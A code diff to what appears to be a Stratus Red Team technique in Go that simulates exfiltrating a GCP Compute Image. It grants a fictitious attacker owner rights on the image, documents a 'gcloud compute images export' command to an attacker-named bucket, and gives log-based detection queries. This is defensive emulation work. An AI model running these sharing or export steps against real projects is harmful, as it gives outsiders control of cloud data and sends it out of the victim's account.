@@ -24,6 +24,7 @@ func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
 		ID:           "gcp.exfiltration.share-compute-image",
 		FriendlyName: "Exfiltrate Compute Image by sharing it",
+		IsSlow:       true,
 		Description: `
 Exfiltrates a Compute Image by sharing with a fictitious attacker account. The attacker could then create a snapshot of the image in their GCP project.
 
@@ -54,14 +55,14 @@ You can detect when someone changes the IAM policy of a Compute Image, using the
   "protoPayload": {
     "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
     "authenticationInfo": {
-      "principalEmail": "user-sharing-the-disk@domain.tld",
-      "principalSubject": "user:user-sharing-the-disk@domain.tld"
+      "principalEmail": "user-sharing-the-image@domain.tld",
+      "principalSubject": "user:user-sharing-the-image@domain.tld"
     },
     "requestMetadata": {
       "callerIp": "34.33.32.31",
       "callerSuppliedUserAgent": "google-cloud-sdk gcloud/..."
     },
-    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-image",
+    "resourceName": "projects/victim-project/global/images/stratus-red-team-victim-image",
     "request": {
       "policy": {
         "version": "3",
@@ -84,51 +85,16 @@ After the attacker has permissions on the Compute Image, they can export it in t
 
 ` + codeBlock + `bash
 	gcloud compute images export \
-	--destination-uri gs://attacker-bucket/ \
+	--destination-uri gs://attacker-bucket/victim-image \
 	--image stratus-red-team-victim-image
 ` + codeBlock + `
 
-When they do so, a GCP Admin Activity event <code>???</code> is generated in the victim project, 
-indicating that the attacker has not only shared but also actively stolen data from the image (sample event shortened below):
-
-` + codeBlock + `json hl_lines="5 6 14 16"
-{
-  "protoPayload": {
-    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
-    "authenticationInfo": {
-      "principalEmail": "attacker@gmail.com",
-      "principalSubject": "user:attacker@gmail.com"
-    },
-    "requestMetadata": {
-      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/...",
-      // Note: the IP of the attacker is not logged in this event
-    },
-    "serviceName": "compute.googleapis.com",
-    "methodName": "v1.compute.snapshots.insert",
-    "resourceName": "projects/victim-project/zones/us-central1-a/disks/stratus-red-team-victim-image",
-    "request": {
-      "@type": "type.googleapis.com/compute.snapshots.insert"
-    },
-    "metadata": {
-      "@type": "type.googleapis.com/google.cloud.audit.CrossEntityControlAuditMetadata"
-    }
-  }
-}
-` + codeBlock + `
-
-Based on these events, detection strategies may include:
+Based on this event, detection strategies may include:
 
 - Alerting when the IAM policy of a Compute Image is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:
 
 ` + codeBlock + `sql
 protoPayload.methodName="v1.compute.images.setIamPolicy"
-` + codeBlock + `
-
-- Alerting when someone with an unexpected e-mail domain exports a Compute Image. Sample GCP Logs Explorer query:
-
-` + codeBlock + `sql
-protoPayload.methodName="v1.compute.images.export"
-NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
 ` + codeBlock + `
 `,
 		Platform:                   stratus.GCP,
@@ -143,11 +109,10 @@ NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
 func detonate(params map[string]string, providers stratus.CloudProviders) error {
 	gcp := providers.GCP()
 	imageName := params["image_name"]
-	zone := params["zone"]
 	attackerPrincipal := gcp_utils.GetAttackerPrincipal()
 
 	log.Println("Exfiltrating " + imageName + " by sharing it with a fictitious attacker")
-	err := shareImage(gcp, imageName, zone, attackerPrincipal)
+	err := shareImage(context.Background(), gcp, imageName, attackerPrincipal)
 	if err != nil {
 		return fmt.Errorf("failed to share image: %w", err)
 	}
@@ -160,22 +125,22 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	imageName := params["image_name"]
 
 	log.Println("Unsharing " + imageName)
-	if err := unshareImage(gcp, imageName); err != nil {
+	if err := unshareImage(context.Background(), gcp, imageName); err != nil {
 		return fmt.Errorf("unable to unshare image: %w", err)
 	}
 	log.Println("Successfully unshared the image - it is now private again")
 	return nil
 }
 
-func shareImage(gcp *providers.GCPProvider, imageName string, targetPrincipal string) error {
-	imageClient, err := compute.NewImagesRESTClient(context.Background(), gcp.Options())
+func shareImage(ctx context.Context, gcp *providers.GCPProvider, imageName string, targetPrincipal string) error {
+	imageClient, err := compute.NewImagesRESTClient(ctx, gcp.Options())
 	if err != nil {
 		return fmt.Errorf("unable to create compute client: %w", err)
 	}
 
 	roleName := "roles/owner"
 
-	_, err = imageClient.SetIamPolicy(context.Background(), &computepb.SetIamPolicyImageRequest{
+	_, err = imageClient.SetIamPolicy(ctx, &computepb.SetIamPolicyImageRequest{
 		Resource: imageName,
 		Project:  gcp.GetProjectId(),
 		GlobalSetPolicyRequestResource: &computepb.GlobalSetPolicyRequest{
@@ -195,13 +160,13 @@ func shareImage(gcp *providers.GCPProvider, imageName string, targetPrincipal st
 	return nil
 }
 
-func unshareImage(gcp *providers.GCPProvider, imageName string, zone string) error {
-	imageClient, err := compute.NewImagesRESTClient(context.Background(), gcp.Options())
+func unshareImage(ctx context.Context, gcp *providers.GCPProvider, imageName string) error {
+	imageClient, err := compute.NewImagesRESTClient(ctx, gcp.Options())
 	if err != nil {
 		return fmt.Errorf("unable to create compute client: %w", err)
 	}
 
-	_, err = imageClient.SetIamPolicy(context.Background(), &computepb.SetIamPolicyImageRequest{
+	_, err = imageClient.SetIamPolicy(ctx, &computepb.SetIamPolicyImageRequest{
 		Resource: imageName,
 		Project:  gcp.GetProjectId(),
 		GlobalSetPolicyRequestResource: &computepb.GlobalSetPolicyRequest{
